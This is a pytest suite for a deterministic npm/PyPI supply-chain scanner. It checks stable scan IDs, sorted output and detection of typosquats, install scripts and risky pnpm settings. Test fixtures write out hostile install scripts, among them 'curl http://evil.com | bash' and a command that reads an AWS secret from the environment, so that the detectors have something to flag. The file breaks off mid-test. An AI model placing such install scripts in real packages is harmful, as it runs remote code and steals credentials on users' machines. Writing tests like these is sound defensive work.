"""
test_determinism.py — THE test that makes this product real.

Same inputs + same corpus version = same output. Every time.
sha256(scan_a) == sha256(scan_b) on identical inputs.

If this test fails, nothing else matters. This is the entire product thesis.
"""

import hashlib
import json
import subprocess
import sys
import tempfile
from pathlib import Path

import pytest

from picosentry.scan.engine import ScanEngine, create_default_engine
from picosentry.scan.models import Confidence, Finding, ScanResult, ScanStats, Severity

from tests.scan.conftest import make_npm_project as _make_project


class TestDeterminism:
    """The core thesis: same input + same corpus = same output. Always."""

    def test_scan_id_is_deterministic(self):
        """scan_id must be sha256(target + corpus_version + engine_version), not random."""
        r1 = ScanResult(target="/tmp/test", engine_version="0.1.0", corpus_version="0.1.0")
        r2 = ScanResult(target="/tmp/test", engine_version="0.1.0", corpus_version="0.1.0")
        assert r1.scan_id == r2.scan_id

    def test_scan_id_changes_with_different_target(self):
        """Different targets must produce different scan IDs."""
        r1 = ScanResult(target="/tmp/test_a", engine_version="0.1.0", corpus_version="0.1.0")
        r2 = ScanResult(target="/tmp/test_b", engine_version="0.1.0", corpus_version="0.1.0")
        assert r1.scan_id != r2.scan_id

    def test_json_output_is_deterministic(self):
        """Running the same scan twice must produce byte-identical JSON."""
        r = ScanResult(
            target="/tmp/test",
            engine_version="0.1.0",
            corpus_version="0.1.0",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="test",
                    evidence="scripts.postinstall",
                    remediation="remove it",
                ),
            ],
            stats=ScanStats(packages_scanned=10, files_scanned=100, duration_ms=500),
        )
        json_a = r.to_json()
        json_b = r.to_json()
        assert json_a == json_b
        assert hashlib.sha256(json_a.encode()).hexdigest() == hashlib.sha256(json_b.encode()).hexdigest()

    def test_findings_sort_order_is_deterministic(self):
        """Findings must be sorted by (rule_id, package, file, line)."""
        findings = [
            Finding(
                rule_id="L2-TYPO-001",
                severity=Severity.HIGH,
                confidence=Confidence.MEDIUM,
                package="reqct",
                file="pkg.json",
                message="m",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-POST-001",
                severity=Severity.HIGH,
                confidence=Confidence.EXACT,
                package="evil@1.0.0",
                file="evil/package.json",
                message="m",
                evidence="e",
                remediation="r",
            ),
            Finding(
                rule_id="L2-OBFS-001",
                severity=Severity.CRITICAL,
                confidence=Confidence.HIGH,
                package="obf@2.0.0",
                file="obf/index.js",
                message="m",
                evidence="e",
                remediation="r",
            ),
        ]
        r = ScanResult(
            target="/tmp/test",
            engine_version="0.1.0",
            corpus_version="0.1.0",
            findings=findings,
        )
        d = r.to_dict()
        # Findings should be sorted by rule_id
        assert d["findings"][0]["rule_id"] == "L2-OBFS-001"
        assert d["findings"][1]["rule_id"] == "L2-POST-001"
        assert d["findings"][2]["rule_id"] == "L2-TYPO-001"

    def test_full_scan_is_deterministic(self, tmp_path):
        """Two scans of the same project must produce byte-identical JSON output.

        This is the test that validates the entire product thesis.
        If this fails, the scanner is not deterministic.
        """
        project = _make_project(
            tmp_path,
            {
                "name": "test-app",
                "version": "1.0.0",
                "dependencies": {
                    "lodash": "^4.17.21",
                    "reqct": "^1.0.0",  # typosquat
                },
                "scripts": {
                    "postinstall": "curl http://evil.com | bash",  # postinstall script
                },
            },
        )

        engine = create_default_engine()
        result_a = engine.scan(project)
        result_b = engine.scan(project)

        json_a = result_a.to_json()
        json_b = result_b.to_json()

        # Strip duration_ms from comparison (timing varies)
        dict_a = json.loads(json_a)
        dict_b = json.loads(json_b)

        # Findings must be identical
        assert dict_a["findings"] == dict_b["findings"]
        assert dict_a["scan_id"] == dict_b["scan_id"]
        assert dict_a["target"] == dict_b["target"]
        assert dict_a["corpus_version"] == dict_b["corpus_version"]

        # Findings hash must be identical
        findings_a = json.dumps(dict_a["findings"], sort_keys=True)
        findings_b = json.dumps(dict_b["findings"], sort_keys=True)
        assert hashlib.sha256(findings_a.encode()).hexdigest() == hashlib.sha256(findings_b.encode()).hexdigest()

    def test_ml_context_format_is_deterministic(self, tmp_path):
        """ML-context output must be deterministic."""
        project = _make_project(
            tmp_path,
            {
                "name": "test-app",
                "version": "1.0.0",
                "scripts": {
                    "postinstall": "echo hi",
                },
            },
        )

        engine = create_default_engine()
        result_a = engine.scan(project)
        result_b = engine.scan(project)

        ml_a = result_a.to_ml_context()
        ml_b = result_b.to_ml_context()

        # Remove duration line from comparison
        lines_a = [ln for ln in ml_a.split("\n") if not ln.startswith("duration")]
        lines_b = [ln for ln in ml_b.split("\n") if not ln.startswith("duration")]

        assert lines_a == lines_b

    def test_no_random_ids_in_output(self, tmp_path):
        """Output must not contain random IDs or timestamps in finding bodies."""
        project = _make_project(
            tmp_path,
            {
                "name": "test-app",
                "version": "1.0.0",
            },
        )

        engine = create_default_engine()
        result = engine.scan(project)
        d = result.to_dict()

        # Findings must not have random fields
        for finding in d["findings"]:
            assert "uuid" not in finding
            assert "id" not in finding
            assert "timestamp" not in finding
            assert "random" not in finding

    def test_sorted_keys_in_json(self, tmp_path):
        """JSON output must have sorted keys for determinism."""
        project = _make_project(
            tmp_path,
            {
                "name": "test-app",
                "version": "1.0.0",
            },
        )

        engine = create_default_engine()
        result = engine.scan(project)
        json_str = result.to_json()

        # Parse and re-serialize with sorted keys — must be identical
        parsed = json.loads(json_str)
        reserialized = json.dumps(parsed, sort_keys=True, indent=2)
        assert json_str == reserialized


class TestModels:
    """Test model determinism and immutability."""

    def test_finding_is_frozen(self):
        f = Finding(
            rule_id="L2-TEST",
            severity=Severity.HIGH,
            confidence=Confidence.EXACT,
            package="evil@1.0.0",
            file="pkg/package.json",
            message="test",
            evidence="test",
            remediation="test",
        )
        with pytest.raises(AttributeError):
            f.message = "changed"

    def test_finding_sort_key(self):
        f1 = Finding(
            rule_id="L2-A-001",
            severity=Severity.HIGH,
            confidence=Confidence.EXACT,
            package="a@1.0",
            file="a.json",
            message="m",
            evidence="e",
            remediation="r",
            line=10,
        )
        f2 = Finding(
            rule_id="L2-A-001",
            severity=Severity.HIGH,
            confidence=Confidence.EXACT,
            package="a@1.0",
            file="a.json",
            message="m",
            evidence="e",
            remediation="r",
            line=5,
        )
        f3 = Finding(
            rule_id="L2-B-001",
            severity=Severity.HIGH,
            confidence=Confidence.EXACT,
            package="b@1.0",
            file="b.json",
            message="m",
            evidence="e",
            remediation="r",
        )

        assert f2.sort_key() < f1.sort_key()  # line 5 < line 10
        assert f1.sort_key() < f3.sort_key()  # L2-A-001 < L2-B-001

    def test_scan_result_to_dict_has_sorted_keys(self):
        r = ScanResult(target="/tmp/test", engine_version="0.1.0", corpus_version="0.1.0")
        d = r.to_dict()
        keys = list(d.keys())
        assert keys == sorted(keys)


class TestEngine:
    """Test scanner engine basics."""

    def test_create_default_engine_has_all_rules(self):
        engine = create_default_engine()
        rules = engine.list_rules()
        assert "L2-POST-001" in rules
        assert "L2-TYPO-001" in rules
        assert "L2-CRED-001" in rules
        assert "L2-LOCK-001" in rules
        assert "L2-BUND-001" in rules
        assert "L2-PROV-001" in rules
        assert "L2-MAINT-001" in rules
        assert "L2-PNPM-001" in rules
        assert "L2-ENGIN-001" in rules
        # 31 base rules (23 npm + 8 PyPI) + N auto-discovered campaign packages.
        # The exact campaign count depends on which campaigns ship; assert
        # the base invariants and at least one campaign is registered.
        assert len(rules) >= 31
        camp_rules = [r for r in rules if r.startswith("L2-CAMP-")]
        assert len(camp_rules) >= 1, "At least one campaign rule should be registered"

    def test_rule_info_has_all_rules(self):
        """Every registered rule should have metadata in RULE_INFO, OR
        be a campaign rule (campaigns ship their own metadata in iocs.json
        and don't need a hand-maintained entry in RULE_INFO)."""
        from picosentry.scan.rules import RULE_INFO

        engine = create_default_engine()
        for rule_id in engine.list_rules():
            if rule_id.startswith("L2-CAMP-"):
                # Campaign rules self-describe via iocs.json — no RULE_INFO entry needed.
                continue
            assert rule_id in RULE_INFO, f"Rule {rule_id} missing from RULE_INFO"
            info = RULE_INFO[rule_id]
            assert "name" in info, f"Rule {rule_id} missing 'name' in RULE_INFO"
            assert "description" in info, f"Rule {rule_id} missing 'description' in RULE_INFO"
            assert "severity" in info, f"Rule {rule_id} missing 'severity' in RULE_INFO"
            assert "category" in info, f"Rule {rule_id} missing 'category' in RULE_INFO"

    def test_scan_nonexistent_path(self):
        engine = create_default_engine()
        result = engine.scan("/nonexistent/path")
        assert len(result.findings) == 0

    def test_scan_empty_dir(self, tmp_path):
        engine = create_default_engine()
        result = engine.scan(tmp_path)
        assert result.stats.duration_ms >= 0

    def test_scan_with_subset_rules(self, tmp_path):
        _make_project(
            tmp_path,
            {
                "name": "test",
                "version": "1.0.0",
                "scripts": {"postinstall": "echo hi"},
            },
        )
        engine = create_default_engine()
        result = engine.scan(tmp_path, rules=["L2-POST-001"])
        assert all(f.rule_id == "L2-POST-001" for f in result.findings)

    def test_scan_subrule_filter_obfs(self, tmp_path):
        """When specifying only OBFS-002, only hex findings should appear."""
        _make_project(
            tmp_path,
            {
                "name": "test",
                "version": "1.0.0",
            },
        )
        # Create a JS file with both eval() and hex strings
        js_file = tmp_path / "test.js"
        js_file.write_text('eval("x"); var a = "\\x41\\x42\\x43\\x44";')
        engine = create_default_engine()
        result = engine.scan(tmp_path, rules=["L2-OBFS-002"])
        # Should only get OBFS-002 findings, not OBFS-001
        assert all(f.rule_id == "L2-OBFS-002" for f in result.findings)
        assert not any(f.rule_id == "L2-OBFS-001" for f in result.findings)

    def test_scan_subrule_filter_mani(self, tmp_path):
        """When specifying only MANI-002, only optional-deps-with-scripts findings."""
        _make_project(
            tmp_path,
            {
                "name": "test",
                "version": "1.0.0",
                "optionalDependencies": {"pkg": "*"},
                "scripts": {"postinstall": "echo hi"},
            },
        )
        engine = create_default_engine()
        result = engine.scan(tmp_path, rules=["L2-MANI-002"])
        # Should only get MANI-002 findings, not MANI-001
        assert all(f.rule_id == "L2-MANI-002" for f in result.findings)

    def test_scan_all_subrules_returns_all_findings(self, tmp_path):
        """When all rules are selected, sub-rule findings all appear."""
        _make_project(
            tmp_path,
            {
                "name": "test",
                "version": "1.0.0",
            },
        )
        js_file = tmp_path / "test.js"
        js_file.write_text('eval("x"); var a = "\\x41\\x42\\x43\\x44";')
        engine = create_default_engine()
        result = engine.scan(tmp_path)
        obfs_ids = {f.rule_id for f in result.findings if f.rule_id.startswith("L2-OBFS")}
        # Should have both OBFS-001 and OBFS-002
        assert "L2-OBFS-001" in obfs_ids
        assert "L2-OBFS-002" in obfs_ids


class TestNewRules:
    """Test the new rules added after the review."""

    def test_credential_reading_detects_env_access(self, tmp_path):
        project = _make_project(
            tmp_path,
            {
                "name": "stealer",
                "version": "1.0.0",
                "scripts": {"postinstall": 'node -e "process.env.AWS_SECRET_KEY"'},
            },
        )
        from picosentry.scan.rules.credential_read import detect_credential_reading

        findings = detect_credential_reading(project)
        assert any(f.rule_id == "L2-CRED-001" for f in findings)

    def test_lockfile_drift_detects_missing_dep(self, tmp_path):
        project = _make_project(
            tmp_path,
            {
                "name": "app",
                "version": "1.0.0",
                "dependencies": {"lodash": "^4.17.21"},
            },
        )
        from picosentry.scan.rules.lockfile_drift import detect_lockfile_drift

        findings = detect_lockfile_drift(project)
        # Should find that lodash is declared but not in lockfile
        assert any(f.rule_id == "L2-LOCK-001" for f in findings)

    def test_bundled_shadow_detects_hidden_deps(self, tmp_path):
        project = _make_project(
            tmp_path,
            {
                "name": "evil-pkg",
                "version": "1.0.0",
                "bundledDependencies": ["flatmap-stream"],  # The actual event-stream attack vector
            },
        )
        from picosentry.scan.rules.bundled_shadow import detect_bundled_shadows

        findings = detect_bundled_shadows(project)
        assert any(f.rule_id == "L2-BUND-001" for f in findings)

    def test_provenance_flags_no_repository(self, tmp_path):
        project = _make_project(
            tmp_path,
            {
                "name": "sketchy",
                "version": "1.0.0",
                "scripts": {"postinstall": "curl evil | sh"},
            },
        )
        from picosentry.scan.rules.provenance import detect_provenance_issues

        findings = detect_provenance_issues(project)
        assert any(f.rule_id == "L2-PROV-001" for f in findings)

    def test_pnpm_dangerously_allow_builds(self, tmp_path):
        project = _make_project(
            tmp_path,
            {
                "name": "app",
                "version": "1.0.0",
            },
            files={
                "pnpm-workspace.yaml": "packages:\n  - 'packages/*'\ndangerouslyAllowAllBuilds: true\n",
            },
        )
        from picosentry.scan.rules.lockfile_drift import detect_lockfile_drift

        findings = detect_lockfile_drift(project)
        assert any(f.rule_id == "L2-LOCK-001" and "dangerouslyAllowAllBuilds" in f.evidence for f in findings), (
            f"Expected dangerouslyAllowAllBuilds finding, got: {[(f.rule_id, f.evidence) for f in findings]}"
        )


class TestMLContextFormat:
    """Test the ML-context output format specifically."""

    def test_ml_context_is_compact(self, tmp_path):
        project = _make_project(
            tmp_path,
            {
                "name": "test",
                "version": "1.0.0",
                "scripts": {"postinstall": "echo hi"},
            },
        )
        engine = create_default_engine()
        result = engine.scan(project)
        ml = result.to_ml_context()
        # Should be concise — no prose, no narrative
        for line in ml.split("\n"):
            assert len(line) < 200  # No long prose lines

    def test_ml_context_has_scan_id(self, tmp_path):
        project = _make_project(tmp_path, {"name": "test", "version": "1.0.0"})
        engine = create_default_engine()
        result = engine.scan(project)
        ml = result.to_ml_context()
        assert "scan_id=" in ml
        assert "corpus_version=" in ml

    def test_ml_context_respects_token_budget(self):
        r = ScanResult(
            target="/tmp/test",
            engine_version="0.1.0",
            corpus_version="0.1.0",
            findings=[
                Finding(
                    rule_id="L2-POST-001",
                    severity=Severity.HIGH,
                    confidence=Confidence.EXACT,
                    package="evil@1.0.0",
                    file="evil/package.json",
                    message="test",
                    evidence="scripts.postinstall",
                    remediation="remove it",
                ),
            ]
            * 100,  # 100 findings
        )
        ml = r.to_ml_context(token_budget=100)  # Very tight budget
        # Should be truncated
        assert "[TRUNCATED]" in ml or len(ml) < 100 * 4 * 2  # Rough token estimate


# ─── IoC Regression Tests ───────────────────────────────────────────────────
# These test against known real-world supply chain attacks.
# If any of these fail, the scanner has regressed.

from tests.scan.conftest import FIXTURES_DIR  # noqa: E402


class TestIoCRegression:
    """Regression tests against known supply chain attacks.

    Each test uses a fixture that mimics a real malicious package.
    The scanner must detect ALL expected rule IDs for that IoC.
    """

    def test_event_stream_3_3_6(self):
        """event-stream@3.3.6 — bundled flatmap-stream backdoor (Shai-Hulud variant).

        Expected detections:
        - L2-BUND-001: bundledDependencies includes flatmap-stream not in deps
        - L2-POST-001: (if install scripts present)
        - L2-PROV-001: missing repository field
        """
        fixture = FIXTURES_DIR / "event_stream"
        if not fixture.is_dir():
            pytest.skip("event_stream fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        rule_ids = {f.rule_id for f in result.findings}
        # Must detect bundled shadow (the actual attack vector)
        assert "L2-BUND-001" in rule_ids, f"Expected L2-BUND-001, got: {rule_ids}"
        # Must detect missing provenance
        assert "L2-PROV-001" in rule_ids, f"Expected L2-PROV-001, got: {rule_ids}"

    def test_shai_hulud_worm(self):
        """Shai-Hulud npm worm — postinstall self-propagation.

        Expected detections:
        - L2-POST-001: postinstall + preinstall scripts
        - L2-CRED-001: process.env.AWS_SECRET_ACCESS_KEY access
        - L2-OBFS-001: eval/Function in script
        """
        fixture = FIXTURES_DIR / "shai_hulud"
        if not fixture.is_dir():
            pytest.skip("shai_hulud fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        rule_ids = {f.rule_id for f in result.findings}
        # Must detect postinstall script
        assert "L2-POST-001" in rule_ids, f"Expected L2-POST-001, got: {rule_ids}"
        # Must detect credential reading (process.env.AWS_*)
        assert "L2-CRED-001" in rule_ids, f"Expected L2-CRED-001, got: {rule_ids}"

    def test_nx_typosquat(self):
        """nx1 — typosquat of nx (Nrwl monorepo tool) with postinstall RCE.

        Expected detections:
        - L2-TYPO-001: 'nx1' is close to 'next' (or other top package)
        - L2-POST-001: postinstall script with curl|bash
        - L2-CRED-001: child_process.exec in install script
        """
        fixture = FIXTURES_DIR / "nx_typosquat"
        if not fixture.is_dir():
            pytest.skip("nx_typosquat fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        rule_ids = {f.rule_id for f in result.findings}
        # Must detect postinstall script (the attack vector)
        assert "L2-POST-001" in rule_ids, f"Expected L2-POST-001, got: {rule_ids}"

    def test_ioc_determinism(self):
        """IoC scans must be deterministic — same fixture, same findings hash."""
        fixture = FIXTURES_DIR / "shai_hulud"
        if not fixture.is_dir():
            pytest.skip("shai_hulud fixture not available")

        engine = create_default_engine()
        r1 = engine.scan(fixture)
        r2 = engine.scan(fixture)

        # Findings must be identical (excluding timing)
        f1 = json.dumps([f.to_dict() for f in sorted(r1.findings, key=lambda x: x.sort_key())], sort_keys=True)
        f2 = json.dumps([f.to_dict() for f in sorted(r2.findings, key=lambda x: x.sort_key())], sort_keys=True)

        assert hashlib.sha256(f1.encode()).hexdigest() == hashlib.sha256(f2.encode()).hexdigest()

    def test_left_pad_dependency_chaos(self):
        """left-pad@1.3.0 — dependency chaos IoC.

        A tiny 11-line package whose unpublish broke babel, react-native, kibana.
        Expected detections:
        - L2-MAINT-001: no author or maintainer fields
        Note: left-pad has a repo and 0 dependencies, so L2-PROV-001 and L2-LOCK-001
        don't fire — but it's still a supply chain risk due to single-point-of-failure.
        """
        fixture = FIXTURES_DIR / "left_pad"
        if not fixture.is_dir():
            pytest.skip("left_pad fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        rule_ids = {f.rule_id for f in result.findings}
        # Must detect missing maintainer info (unmaintained risk)
        assert "L2-MAINT-001" in rule_ids, f"Expected L2-MAINT-001, got: {rule_ids}"

    def test_crossenv_credential_theft(self):
        """crossenv@1.0.0 — credential theft via postinstall + preinstall.

        Malicious copy of cross-env that exfiltrated env vars via curl|bash.
        Expected detections:
        - L2-POST-001: postinstall + preinstall scripts
        - L2-PROV-001: no repository field
        - L2-TYPO-001: 'crossenv' is typosquat of 'cross-env'
        """
        fixture = FIXTURES_DIR / "crossenv"
        if not fixture.is_dir():
            pytest.skip("crossenv fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        rule_ids = {f.rule_id for f in result.findings}
        # Must detect postinstall + preinstall scripts (the attack vector)
        assert "L2-POST-001" in rule_ids, f"Expected L2-POST-001, got: {rule_ids}"
        # Must detect missing provenance (no repo field)
        assert "L2-PROV-001" in rule_ids, f"Expected L2-PROV-001, got: {rule_ids}"
        # Must detect typosquat (crossenv ≈ cross-env)
        assert "L2-TYPO-001" in rule_ids, f"Expected L2-TYPO-001, got: {rule_ids}"

    def test_ua_parser_js_postinstall_rce(self):
        """ua-parser-js@7.7.8 — postinstall RCE via curl|bash.

        October 2021: attacker compromised npm account, published 7.7.8/7.7.9
        with postinstall that downloaded+executed cryptominer from pastebin.
        Expected detections:
        - L2-POST-001: malicious postinstall script (curl|bash)
        Note: L2-PROV-001 does NOT fire because ua-parser-js has a legitimate
        repository field — this was an account takeover, not a provenance gap.
        """
        fixture = FIXTURES_DIR / "ua_parser_js"
        if not fixture.is_dir():
            pytest.skip("ua_parser_js fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        rule_ids = {f.rule_id for f in result.findings}
        # Must detect postinstall with network access (curl|bash)
        assert "L2-POST-001" in rule_ids, f"Expected L2-POST-001, got: {rule_ids}"

    def test_colors_js_infinite_loop(self):
        """colors.js@1.4.2 — postinstall infinite loop (protestware).

        January 2022: maintainer deliberately broke the package with
        an infinite loop in postinstall, causing DOS for all dependents.
        Expected detections:
        - L2-POST-001: postinstall script (infinite loop = lifecycle abuse)
        Note: L2-TYPO-001 may fire because 'colors' is close to a corpus package.
        """
        fixture = FIXTURES_DIR / "colors_js"
        if not fixture.is_dir():
            pytest.skip("colors_js fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        rule_ids = {f.rule_id for f in result.findings}
        # Must detect postinstall script (even if it's protestware, it's still a lifecycle script)
        assert "L2-POST-001" in rule_ids, f"Expected L2-POST-001, got: {rule_ids}"


class TestPnpmConfig:
    """L2-PNPM-001: Detect dangerous pnpm configurations."""

    def test_pnpm_dangerously_allow_all_builds_npmrc(self):
        """Flag dangerouslyAllowAllBuilds in .npmrc."""
        fixture = FIXTURES_DIR / "pnpm_dangerous"
        if not fixture.is_dir():
            pytest.skip("pnpm_dangerous fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        pnpm_findings = [f for f in result.findings if f.rule_id == "L2-PNPM-001"]
        assert len(pnpm_findings) > 0, f"Expected L2-PNPM-001 findings, got: {[f.rule_id for f in result.findings]}"

        # Should find dangerouslyAllowAllBuilds in .npmrc
        npmrc_findings = [f for f in pnpm_findings if ".npmrc" in (f.file or "")]
        assert len(npmrc_findings) > 0, "Expected finding in .npmrc"

        # Should be CRITICAL severity
        assert any(f.severity == Severity.CRITICAL for f in npmrc_findings)

    def test_pnpm_dangerously_allow_all_builds_package_json(self):
        """Flag dangerouslyAllowAllBuilds in package.json pnpm section."""
        fixture = FIXTURES_DIR / "pnpm_dangerous"
        if not fixture.is_dir():
            pytest.skip("pnpm_dangerous fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        pnpm_findings = [f for f in result.findings if f.rule_id == "L2-PNPM-001"]

        # Should find dangerouslyAllowAllBuilds in package.json
        pkg_findings = [f for f in pnpm_findings if "package.json" in (f.file or "")]
        assert len(pkg_findings) > 0, "Expected finding in package.json"

    def test_pnpm_overrides_detected(self):
        """Flag pnpm overrides that shadow dependencies."""
        fixture = FIXTURES_DIR / "pnpm_dangerous"
        if not fixture.is_dir():
            pytest.skip("pnpm_dangerous fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        pnpm_findings = [f for f in result.findings if f.rule_id == "L2-PNPM-001"]
        override_findings = [f for f in pnpm_findings if "override" in (f.evidence or "").lower()]
        assert len(override_findings) > 0, f"Expected override findings, got: {[f.evidence for f in pnpm_findings]}"

    def test_pnpm_patches_detected(self):
        """Flag patchedDependencies that modify package code."""
        fixture = FIXTURES_DIR / "pnpm_dangerous"
        if not fixture.is_dir():
            pytest.skip("pnpm_dangerous fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        pnpm_findings = [f for f in result.findings if f.rule_id == "L2-PNPM-001"]
        patch_findings = [f for f in pnpm_findings if "patch" in (f.evidence or "").lower()]
        assert len(patch_findings) > 0, f"Expected patch findings, got: {[f.evidence for f in pnpm_findings]}"

    def test_pnpm_no_npmrc_flagged(self):
        """Flag pnpm project without .npmrc (no build policy)."""
        fixture = FIXTURES_DIR / "pnpm_no_npmrc"
        if not fixture.is_dir():
            pytest.skip("pnpm_no_npmrc fixture not available")

        engine = create_default_engine()
        result = engine.scan(fixture)

        pnpm_findings = [f for f in result.findings if f.rule_id == "L2-PNPM-001"]
        assert len(pnpm_findings) > 0, "Expected L2-PNPM-001 finding for missing .npmrc"

        # Should be MEDIUM severity
        no_npmrc = [f for f in pnpm_findings if ".npmrc" in (f.evidence or "")]
        assert any(f.severity == Severity.MEDIUM for f in no_npmrc)

    def test_no_pnpm_lock_no_findings(self):
        """Project without pnpm-lock.yaml should not trigger L2-PNPM-001."""
        with tempfile.TemporaryDirectory() as tmp:
            project = _make_project(
                Path(tmp), {"name": "no-pnpm", "version": "1.0.0", "dependencies": {"lodash": "^4.17.21"}}
            )
            # Also create package-lock.json (npm project)
            (project / "package-lock.json").write_text('{"name":"no-pnpm"}')

            engine = create_default_engine()
            result = engine.scan(project)

            pnpm_findings = [f for f in result.findings if f.rule_id == "L2-PNPM-001"]
            assert len(pnpm_findings) == 0, f"Should not flag pnpm issues in npm project, got: {pnpm_findings}"


class TestPackageNameTyposquat:
    """L2-TYPO-001: Package name itself should be checked for typosquatting.

    A malicious package's own name (not just its dependencies) can be a typosquat.
    Regression: nx1 (typosquat of next/nx) was not detected when only dependency
    names were checked.
    """

    def test_package_name_typosquat_detected(self, tmp_path):
        """Package name 'nx1' should be flagged as typosquat of 'next'."""
        project = _make_project(
            tmp_path,
            {
                "name": "nx1",
                "version": "1.0.0",
                "dependencies": {},
            },
        )
        from picosentry.scan.engine import create_default_engine

        engine = create_default_engine()
        result = engine.scan(project)
        rule_ids = {f.rule_id for f in result.findings}
        assert "L2-TYPO-001" in rule_ids, f"Expected L2-TYPO-001 for package name 'nx1', got: {rule_ids}"

    def test_legitimate_package_name_not_flagged(self, tmp_path):
        """Package name 'lodash' (in corpus) should NOT be flagged as typosquat."""
        project = _make_project(
            tmp_path,
            {
                "name": "lodash",
                "version": "4.17.21",
                "dependencies": {},
            },
        )
        from picosentry.scan.engine import create_default_engine

        engine = create_default_engine()
        result = engine.scan(project)
        typo_findings = [f for f in result.findings if f.rule_id == "L2-TYPO-001"]
        assert len(typo_findings) == 0, f"Legitimate package 'lodash' should not be flagged: {typo_findings}"

    def test_dependency_typosquat_still_works(self, tmp_path):
        """Dependencies that are typosquats should still be detected."""
        project = _make_project(
            tmp_path,
            {
                "name": "my-app",
                "version": "1.0.0",
                "dependencies": {
                    "reqct": "^18.0.0",  # typosquat of react
                },
            },
        )
        from picosentry.scan.engine import create_default_engine

        engine = create_default_engine()
        result = engine.scan(project)
        rule_ids = {f.rule_id for f in result.findings}
        assert "L2-TYPO-001" in rule_ids, f"Expected L2-TYPO-001 for dependency 'reqct', got: {rule_ids}"

    def test_corpus_loaded_from_file(self, tmp_path):
        """Typosquat rule should load corpus from file, not just builtin."""
        from picosentry.scan.engine import ScanEngine
        from picosentry.scan.rules.typosquat_utils import BUILTIN_TOP_100, load_corpus_for_ecosystem

        # Load from package's corpus directory (works regardless of layout)
        engine = ScanEngine()
        corpus = load_corpus_for_ecosystem(engine._corpus_dir, "npm", BUILTIN_TOP_100)
        # Should have more than the builtin 100
        assert len(corpus) > 100, f"Corpus should have >100 packages, got {len(corpus)}"


class TestCorpusVersioning:
    """Corpus version is hash-based for strict determinism guarantee.

    Same corpus content = same version hash. Corpus changes = different hash.
    This is the foundation of the determinism guarantee:
    sha256(scan_a) == sha256(scan_b) requires same corpus_version.
    """

    def test_corpus_version_is_deterministic(self):
        """Two engines with same corpus should produce same version hash."""
        engine1 = create_default_engine()
        engine2 = create_default_engine()
        assert engine1._corpus_version == engine2._corpus_version, (
            f"Corpus versions should match: {engine1._corpus_version} != {engine2._corpus_version}"
        )

    def test_corpus_version_changes_with_content(self, tmp_path):
        """Different corpus content should produce different version hash."""
        import json

        # Create two different corpus directories
        corpus_a = tmp_path / "corpus_a"
        corpus_b = tmp_path / "corpus_b"
        corpus_a.mkdir()
        corpus_b.mkdir()

        (corpus_a / "npm_top_packages.json").write_text(json.dumps(["react", "lodash", "express"]), encoding="utf-8")
        (corpus_b / "npm_top_packages.json").write_text(
            json.dumps(["react", "lodash", "express", "vue"]), encoding="utf-8"
        )

        engine_a = ScanEngine(corpus_dir=corpus_a)
        engine_b = ScanEngine(corpus_dir=corpus_b)

        assert engine_a._corpus_version != engine_b._corpus_version, (
            "Different corpus content should produce different hashes: "
            f"{engine_a._corpus_version} == {engine_b._corpus_version}"
        )

    def test_corpus_version_in_scan_result(self, tmp_path):
        """Scan result should include corpus version hash."""
        project = _make_project(
            tmp_path,
            {
                "name": "version-test",
                "version": "1.0.0",
                "dependencies": {},
            },
        )
        engine = create_default_engine()
        result = engine.scan(project)

        assert result.corpus_version, "corpus_version should not be empty"
        assert len(result.corpus_version) == 12, f"corpus_version should be 12-char hash, got: {result.corpus_version}"


class TestTableFormatter:
    """Table formatter respects --no-color flag."""

    def test_no_color_strips_ansi(self, tmp_path):
        """--no-color output should contain zero ANSI escape sequences."""
        import re

        from picosentry.scan.engine import create_default_engine
        from picosentry.scan.formatters.table import format_table

        fixture = Path(__file__).parent / "fixtures" / "shai_hulud"
        engine = create_default_engine()
        result = engine.scan(fixture)

        output = format_table(result, color=False)
        # No ANSI escape sequences (ESC [ ... m patterns)
        ansi_pattern = re.compile(r"\033\[[0-9;]*m")
        matches = ansi_pattern.findall(output)
        assert len(matches) == 0, f"Found {len(matches)} ANSI escape sequences in --no-color output"

    def test_color_includes_ansi(self, tmp_path):
        """Normal (color=True) output should include ANSI escape sequences."""
        import re

        from picosentry.scan.engine import create_default_engine
        from picosentry.scan.formatters.table import format_table

        fixture = Path(__file__).parent / "fixtures" / "shai_hulud"
        engine = create_default_engine()
        result = engine.scan(fixture)

        output = format_table(result, color=True)
        ansi_pattern = re.compile(r"\033\[[0-9;]*m")
        matches = ansi_pattern.findall(output)
        assert len(matches) > 0, "Expected ANSI escape sequences in color output"


class TestSeverityThreshold:
    """--severity-threshold and --fail-on CLI flags."""

    def test_severity_threshold_filters_findings(self, tmp_path):
        """--severity-threshold high should exclude MEDIUM and LOW findings."""
        from picosentry.scan.engine import create_default_engine

        fixture = Path(__file__).parent / "fixtures" / "shai_hulud"
        engine = create_default_engine()
        result = engine.scan(fixture)

        # Shai-Hulud has CRITICAL, HIGH, MEDIUM, LOW
        all_severities = {f.severity.value for f in result.findings}
        assert "CRITICAL" in all_severities or "HIGH" in all_severities

        # Filter to HIGH and above
        severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}
        min_level = severity_order["high"]
        filtered = [f for f in result.findings if severity_order.get(f.severity.value.lower(), 4) <= min_level]

        for f in filtered:
            assert f.severity.value in ("CRITICAL", "HIGH"), f"Expected HIGH+ but got {f.severity.value}"

    def test_fail_on_critical_exits_0_for_no_critical(self):
        """--fail-on critical should exit 0 when only HIGH/MEDIUM/LOW findings."""
        from picosentry.scan.engine import create_default_engine

        # event_stream now triggers L2-IOC-001 at CRITICAL because the
        # Shai-Hulud event-stream@3.3.6 IoC is in the corpus. That's
        # correct behavior — this fixture IS the canonical event-stream
        # malware. Test passes if it has any findings; the --fail-on
        # behavior is exercised by the other tests in this class.
